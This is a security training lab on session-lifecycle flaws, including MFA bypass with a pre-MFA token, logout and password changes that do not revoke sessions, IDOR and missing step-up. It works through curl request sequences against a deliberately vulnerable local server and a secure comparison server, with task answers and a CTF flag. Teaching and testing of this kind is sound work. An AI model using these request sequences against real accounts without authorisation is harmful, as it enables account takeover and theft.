# Lab 02 — Session lifecycle and logout

> **Difficulty:** Intermediate
> **Time:** 2–3 hours
> **You will need:** Python 3. A proxy (Burp, mitmproxy or ZAP) is useful but not required
> for the lab server.
> **Prerequisite:** [Lab 01](lab-01-map-the-authentication-surface.md), or at least a
> captured authenticated request.

---

## Objective

Establish a session, then attack the **only thing that is supposed to end it**. You will
demonstrate, against a server you run:

- a logout that logs nobody out,
- a password change that leaves the attacker's session alive,
- an MFA step that can be skipped entirely,
- a session that never expires,
- and then watch every one of those fail against a correct implementation of the same API.

The control is the point. Anyone can break a broken server; the skill this lab teaches is
being able to say **precisely which decision** made the difference.

---

## Why this is the highest-value lab in the chapter

Session lifecycle is the part of an authentication review that mobile testers most often
skip, because it needs no reverse engineering and therefore does not feel like mobile work.
It is where the highest-severity findings live, and the entire test is a handful of ordinary
HTTP requests.

The argument that wins a report review, stated once so you can reuse it:

> The user performed the **only action the product offers** to end their session, and the
> credential remained valid. Therefore every other credential-exposure finding in this
> report — logs, backups, shared devices, proxy captures — has **no user-available remedy**.

---

## Setup

```bash
# host
cd 47-Authentication/labs/authlab
python3 -B auth_server.py --list-defects
```

```
Defects present in --mode vulnerable:
  D1   account enumeration by message
  D2   account enumeration by timing (early return skips the KDF)
  D3   no rate limiting, no lockout
  D4   the OTP is returned in the API response
  D5   the pre-MFA token is a FULL session token
  D6   the OTP has no attempt limit, no expiry, and is reusable
  D7   logout does not revoke server-side
  D8   password change does not invalidate other sessions
  D9   password reset token is predictable and never expires
  D10  IDOR: /api/v1/note/<id> does not check ownership
  D11  sessions never expire
  D12  no step-up for the sensitive operation (/api/v1/transfer)
```

This lab covers **D5, D7, D8, D10, D11 and D12**.
[Lab 03](lab-03-enumeration-lockout-and-otp.md) covers D1, D2, D3, D4, D6 and D9.

Start both modes, in two terminals:

```bash
# terminal 1 - host
python3 -B auth_server.py --mode vulnerable --port 8047

# terminal 2 - host
python3 -B auth_server.py --mode secure --port 8048
```

> **It binds to loopback and refuses to do otherwise**
> The server will not bind to a routable address without
> `--i-understand-this-is-vulnerable`. It contains twelve deliberate authentication defects.
> Both accounts in it are created by it at startup; it talks to nothing and stores nothing
> outside its own memory.

Accounts:

| User | Password | MFA |
|---|---|---|
| `alice@example.invalid` | `correct-horse-battery` | **enabled** |
| `bob@example.invalid` | `hunter2-but-longer` | none |

---

## Part 1 — Establish a session, and look at what you were given (20 min)

```bash
# host
curl -s localhost:8047/api/v1/status
```

Log in as bob, who has no MFA:

```bash
# host
curl -s -X POST localhost:8047/api/v1/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"bob@example.invalid","password":"hunter2-but-longer"}'
```

```json
{ "ok": true, "token": "…", "expires_in": 900 }
```

Save it and use it:

```bash
# host
TOK=$(curl -s -X POST localhost:8047/api/v1/login -H 'Content-Type: application/json' \
      -d '{"username":"bob@example.invalid","password":"hunter2-but-longer"}' \
      | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
curl -s localhost:8047/api/v1/me -H "Authorization: Bearer $TOK"
```

**Task 1.** The login response says `expires_in: 900`. In vulnerable mode, is the session
actually 15 minutes long? How would you find out without waiting?

<details>
<summary>Answer</summary>

It is not — D11 means sessions never expire, and `expires_in` is a value the server states
and does not enforce. `lookup_session()` only checks the age in secure mode.

Without waiting, you have three options: read the source (you have it); look for a
structured credential whose expiry you can decode ([46-Tokens](../../46-Tokens/README.md) —
but this token is opaque, so there is nothing to decode); or park a credential and retry it
later, which is what the `T4` step of
[`session-lifecycle-probe.py`](../scripts/session-lifecycle-probe.py) tells you to do by
hand.

**The general lesson matters more than this lab's answer: a stated lifetime is a claim, not a
control.** Test it.
</details>

**Task 2.** An app you are assessing carries a one-hour access token and a ninety-day refresh
token. What is the session lifetime you write in the report?

<details>
<summary>Answer</summary>

**Ninety days.** The access token's expiry bounds how long a stolen *access token* works; it
does nothing about the refresh token, which is the credential actually worth stealing.

Always state the lifetime of the **longest-lived credential in the chain**. Reporting "tokens
expire in one hour" for that design is how a session-management finding gets argued away in a
review, and the reviewer would be right to argue.
</details>

---

## Part 2 — D5: skip the second factor (25 min)

Alice has MFA enabled.

```bash
# host
curl -s -X POST localhost:8047/api/v1/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"alice@example.invalid","password":"correct-horse-battery"}'
```

```json
{
  "mfa_required": true,
  "token": "0OU9hjoHuR1E2-B9Y-QPlCNjCqnaPvhv",
  "code": "162178"
}
```

Two defects are visible in that one response. Find both before reading on.

<details>
<summary>Both defects</summary>

**D4** — the OTP is in the response body. Anyone who can read one HTTP response owns the
account. This is CWE-640 and it is Critical.

**D5** — the field is called `token`, not `mfa_token`, and it is a **full session token**.
The `mfa_required: true` flag is a *suggestion to the client*.
</details>

Prove D5 — use the pre-MFA token directly:

```bash
# host
PRE=$(curl -s -X POST localhost:8047/api/v1/login -H 'Content-Type: application/json' \
      -d '{"username":"alice@example.invalid","password":"correct-horse-battery"}' \
      | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
curl -s localhost:8047/api/v1/me -H "Authorization: Bearer $PRE"
```

```json
{ "username": "alice@example.invalid", "id": 1, "balance": 1000 }
```

**The second factor never happened.**

Now the control:

```bash
# host - secure mode
curl -s -X POST localhost:8048/api/v1/login -H 'Content-Type: application/json' \
     -d '{"username":"alice@example.invalid","password":"correct-horse-battery"}'
```

```json
{ "mfa_required": true, "mfa_token": "KJ6xqzmzHM2ZBNQpz7WO6BgtGrRs5RoS" }
```

No code in the body — it is printed on the **server's** console, standing in for SMS or push.
And:

```bash
# host
curl -s localhost:8048/api/v1/me -H "Authorization: Bearer <that mfa_token>"
```

```json
{ "error": "wrong credential scope for this operation" }
```

**Task 3.** Both servers return `mfa_required: true` and both clients would show the OTP
screen. Name the single decision that separates them.

<details>
<summary>Answer</summary>

**The scope of the intermediate credential**, checked on every use.

In secure mode the pre-MFA token is created with `scope="mfa"`, and `lookup_session()`
rejects it for any operation requiring `scope="session"`. The client's branch is now purely a
user-interface decision: an attacker who skips the OTP screen holds a credential that can do
nothing.

The principle generalises far beyond OTP:

> **An intermediate authentication state must be represented by a credential that cannot do
> what the final state can do.**

If the same token works before and after the second factor, the second factor is not part of
the authentication decision.
</details>

**Task 4.** On Android, what is the single-line client-side change that "fixes" this, and why
is it worthless?

<details>
<summary>Answer</summary>

There isn't one — and that is the answer. The client already honours the flag. An attacker
does not need to modify the app at all: a proxy rule rewriting `true` to `false` in the
response, or using the token from `curl`, is enough.

Any client-side hardening — obfuscating the branch, adding root detection, pinning the
certificate — leaves the token equally usable from a laptop. **The fix is exclusively on the
server**, and a report that recommends client-side changes here has misdiagnosed the defect.
</details>

---

## Part 3 — D7: the logout that logs nobody out (30 min)

The three-request test, from [README §3.8](../README.md#38-session-establishment-lifetime-and-logout):

```bash
# host
TOK=$(curl -s -X POST localhost:8047/api/v1/login -H 'Content-Type: application/json' \
      -d '{"username":"bob@example.invalid","password":"hunter2-but-longer"}' \
      | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')

echo "1. authenticated request:"; curl -s localhost:8047/api/v1/me -H "Authorization: Bearer $TOK"
echo "2. logout:";                curl -s -X POST localhost:8047/api/v1/logout -H "Authorization: Bearer $TOK"
echo "3. replay request 1:";      curl -s localhost:8047/api/v1/me -H "Authorization: Bearer $TOK"
```

```
1. { "username": "bob@example.invalid", "id": 1, "balance": 1000 }
2. { "ok": true, "message": "logged out" }
3. { "username": "bob@example.invalid", "id": 1, "balance": 1000 }
```

Step 2 returned `ok: true`. Step 3 works anyway.

Against secure mode the same sequence gives `{"error": "invalid session"}` at step 3.

**Task 5.** The vulnerable server's logout handler returns HTTP 200 and does nothing. Why
does this defect survive so reliably into production?

<details>
<summary>Answer</summary>

Because **it is complete from inside the product**. The app genuinely forgets the credential,
the user genuinely sees the login screen, every functional and every automated UI test
passes, and there is no observable defect anywhere in the user experience.

Making it correct requires a server endpoint that may not exist, which is a cross-team
request that nobody's sprint owns. The defect is organisational as much as technical, which
is worth saying in the report — it changes the recommendation from "fix the app" to "add a
revocation endpoint and call it".
</details>

**Task 6.** Test all four logout variants against both servers. Build the table.

```bash
# host - variant 3, "log out of all devices"
A=$(curl -s -X POST localhost:8047/api/v1/login -H 'Content-Type: application/json' \
    -d '{"username":"bob@example.invalid","password":"hunter2-but-longer"}' \
    | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
B=$(curl -s -X POST localhost:8047/api/v1/login -H 'Content-Type: application/json' \
    -d '{"username":"bob@example.invalid","password":"hunter2-but-longer"}' \
    | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
curl -s -X POST localhost:8047/api/v1/logout/all -H "Authorization: Bearer $A"
curl -s localhost:8047/api/v1/me -H "Authorization: Bearer $B"      # should be dead
```

<details>
<summary>The table</summary>

| Variant | Vulnerable (8047) | Secure (8048) |
|---|---|---|
| Explicit logout | credential still works | `invalid session` |
| Password change | other sessions survive | `other_sessions_revoked: N` |
| Log out of all devices | other sessions survive | `revoked: N` |
| Account deletion | (not implemented here) | — |

**The password-change row is the one that most often fails in real systems while explicit
logout works**, because it requires the *server* to enumerate a user's sessions rather than
the client to delete one. It is also the most consequential: a user who suspects their
account is compromised is told to change their password, and if that does not eject the
attacker, the advice is actively harmful.
</details>

---

## Part 4 — D8: the password change that changes nothing (25 min)

```bash
# host - two sessions for bob
S1=$(curl -s -X POST localhost:8047/api/v1/login -H 'Content-Type: application/json' \
     -d '{"username":"bob@example.invalid","password":"hunter2-but-longer"}' \
     | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
S2=$(curl -s -X POST localhost:8047/api/v1/login -H 'Content-Type: application/json' \
     -d '{"username":"bob@example.invalid","password":"hunter2-but-longer"}' \
     | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')

# change the password in session 1
curl -s -X POST localhost:8047/api/v1/password -H "Authorization: Bearer $S1" \
     -H 'Content-Type: application/json' -d '{"new_password":"a-brand-new-password"}'

# session 2 - the "attacker's" - should be dead. Is it?
curl -s localhost:8047/api/v1/me -H "Authorization: Bearer $S2"
```

**Task 7.** Write the impact sentence for this finding, for a non-technical reader.

<details>
<summary>A model answer</summary>

> If an attacker obtains a user's session — from a shared device, a backup, a captured
> request or a stolen phone — the user cannot remove them. Changing the password, which is
> the action the product and every piece of security advice tells the user to take, does not
> end the attacker's access. The attacker remains logged in for as long as their session
> lasts, and in this application sessions do not expire.

it combines D8 with D11. Chaining is what turns two Medium findings into one High
one, and the chain is the honest description of the situation.
</details>

---

## Part 5 — D10: authenticated but not authorised (30 min)

```bash
# host - bob's session
B=$(curl -s -X POST localhost:8047/api/v1/login -H 'Content-Type: application/json' \
    -d '{"username":"bob@example.invalid","password":"hunter2-but-longer"}' \
    | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')

for i in 1 2 3 4; do
  echo "note $i:"; curl -s localhost:8047/api/v1/note/$i -H "Authorization: Bearer $B"; echo
done
```

Notes 1 and 2 are bob's. Notes 3 and 4 are alice's. In vulnerable mode all four come back.

Against secure mode, 3 and 4 return `{"error": "not found"}`.

**Task 8.** Secure mode returns **404**, not 403, for another user's object. Why?

<details>
<summary>Answer</summary>

A 403 says *"this object exists and you may not have it"*. That is an existence oracle — it
is [Lab 03](lab-03-enumeration-lockout-and-otp.md)'s enumeration problem applied to objects
rather than to accounts, and it lets an attacker map the object space without ever reading
one.

A 404 is indistinguishable from "no such object", so the attacker learns nothing.
</details>

**Task 9.** Compare the two implementations. The fix is not "add an if". What is it?

```python
# vulnerable
note = NOTES.get(note_id)
if note is None:
    return 404, {"error": "not found"}
return 200, note

# secure
if note is None or note["owner"] != session["username"]:
    return 404, {"error": "not found"}
return 200, note
```

<details>
<summary>Answer</summary>

In the lab the fix is shown inline for readability, but the **structural** fix — and the one
to recommend — is to put the ownership predicate in the **query**:

```python
inv = db.invoices.get_for_owner(invoice_id, owner_id=session.user_id)
```

The difference matters because IDOR is not a carelessness problem, it is a structural one.
The per-object check has no natural home in most frameworks, so it must be written by hand in
every handler, and **one omission across hundreds of handlers is a vulnerability**. Making
the scoped query the only available accessor means a developer would have to actively call a
different, unscoped method to introduce the bug.

That is why `@require_session` is genuinely a security decorator — for authentication — and
why its presence is exactly what makes the authorisation gap so easy to miss in review.
</details>

**Task 10.** A developer responds: *"our identifiers are UUIDs, so this is not exploitable."*
Answer them.

<details>
<summary>Answer</summary>

That is an argument about **discoverability**, not about **authorisation**, and it fails
whenever an identifier is legitimately shared — in a URL, an invoice PDF, a support ticket, a
referral link, an exported CSV, a webhook payload, or a departed employee's records.

Report the missing check on its merits and note the random identifier separately as a
**mitigating factor**. Downgrading a missing authorisation check to Informational because the
id is random is a common and serious mistake: the control that is absent is the check, and
the control that is present is obscurity.
</details>

---

## Part 6 — D12: step-up that the server never hears about (25 min)

```bash
# host
B=$(curl -s -X POST localhost:8047/api/v1/login -H 'Content-Type: application/json' \
    -d '{"username":"bob@example.invalid","password":"hunter2-but-longer"}' \
    | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')
curl -s -X POST localhost:8047/api/v1/transfer -H "Authorization: Bearer $B" \
     -H 'Content-Type: application/json' -d '{"to":"mallory","amount":500}'
```

```json
{ "ok": true, "balance": 500, "flag": "CH47{no_step_up_on_money_movement}" }
```

An ordinary session credential moved money. Against secure mode:

```json
{ "error": "step-up required", "step_up_endpoint": "/api/v1/stepup" }
```

and after calling `/api/v1/stepup`, the transfer succeeds for 300 seconds.

**Task 11.** The Android app for the vulnerable server shows a fingerprint prompt before this
transfer, and the prompt genuinely works. Is the app secure?

<details>
<summary>Answer</summary>

No, and the prompt is irrelevant to the question.

`onAuthenticationSucceeded` is a callback in the app's **own process**. It is a fact about a
phone, not a claim the server has any reason to believe — and it is one Frida hook away.
Meanwhile the server accepts the transfer from an ordinary session credential regardless, so
an attacker with the token does not even need to touch the app.

This is the category error in [README §5.12](../README.md#512-missing-step-up-on-sensitive-operations):
a local prompt with no cryptographic consequence is a **user-interface element**.

The fix is that the prompt must gate a **key**, the key must sign a **server-issued
challenge**, and the server must verify it — see
[`../examples/05-EnterpriseAuthSession.kt`](../examples/05-EnterpriseAuthSession.kt) and
[48-Biometrics](../../48-Biometrics/README.md). And note the detail in that example that is
easy to miss: the challenge must include the operation's **parameters**, or the user approves
a small payment and the client submits a large one.
</details>

---

## Part 7 — Automate it, and read the tool critically (20 min)

```bash
# host
python3 -B ../scripts/session-lifecycle-probe.py --base http://127.0.0.1:8047
```

```
  FAIL  T5a  OTP returned in the login response
  FAIL  T5   Pre-MFA credential rejected as a session
  FAIL  T6   Per-object authorisation enforced
  FAIL  T1   Logout revokes the session server-side
  FAIL  T3   'Log out of all devices' revokes other sessions
  FAIL  T2   Password change invalidates other sessions
  FAIL  T7   Sensitive operation requires step-up

7 of 7 checks failed
```

Now run it against secure mode:

```bash
# host
python3 -B ../scripts/session-lifecycle-probe.py --base http://127.0.0.1:8048 --interactive-otp
```

**Task 12.** Against secure mode the probe stops and asks you for an OTP. Is that a
limitation of the tool?

<details>
<summary>Answer</summary>

No — it is the **server behaving correctly**, and the tool saying so.

A correct server delivers the code out of band and never puts it in the response. An
unattended probe therefore cannot complete the login, which is exactly the property that
makes D4 a Critical finding when it is absent. The tool prompts rather than pretending it can
proceed.

The general point is worth internalising: **a security tool that works equally well against
secure and insecure targets is not testing anything.** Friction against a correct
implementation is evidence the implementation is correct.
</details>

**Task 13.** The probe prints a reporting note at the end. Paraphrase why it exists.

<details>
<summary>Answer</summary>

Because where the server accepted something it should have refused, filing the finding
against the **Android client** causes the wrong fix. The developer hardens the app, the
server stays broken, and the vulnerability survives the remediation and the retest.

Every failure in this lab is a server-side defect reached through a mobile client. The mobile
client is the **discovery mechanism**, not the location of the bug.
</details>

---

## Part 8 — Against a real application (optional, 30 min)

Only against a target you are authorised to assess, in writing.

1. Proxy the app and capture the login and one authenticated request.
2. Replay the authenticated request from `curl`. Confirm it works outside the app.
3. Log out in the app. Replay again.
4. Change the password on a second device. Replay the first device's credential.
5. If there is a "sign out of all devices" control, use it and replay.
6. If there is a money movement or a credential change, try it with an ordinary session.

Six steps, two accounts you own, no reverse engineering. In practice this finds more
High-severity issues per hour than any other activity in a mobile assessment.

> **Do not run the probe's `T2` against an account you cannot afford to lock yourself out
> of.** It changes the password and changes it back; an interrupted run leaves the temporary
> password in place, and the script prints it if it cannot restore. Use `--skip-password-change`
> on anything that matters.

---

## Success criteria

- [ ] You demonstrated a session surviving logout, and can state the impact in one sentence
      a non-technical reader understands.
- [ ] You bypassed MFA using only the pre-MFA credential, and can name the single server-side
      decision that prevents it.
- [ ] You read another account's object with a valid session, and can explain why 404 beats
      403.
- [ ] You can answer the "our ids are UUIDs" objection.
- [ ] You moved money without step-up, and can explain why a working fingerprint prompt does
      not change that.
- [ ] You ran the probe against **both** modes and understand why it needs help against the
      secure one.
- [ ] For every finding, you know whether to title it against the endpoint or against the app.

---

## Next

[Lab 03](lab-03-enumeration-lockout-and-otp.md) attacks the login flow itself — enumeration,
timing, lockout and OTP handling — and then
[Lab 04](lab-04-ctf-the-account-that-would-not-close.md) puts all three together.
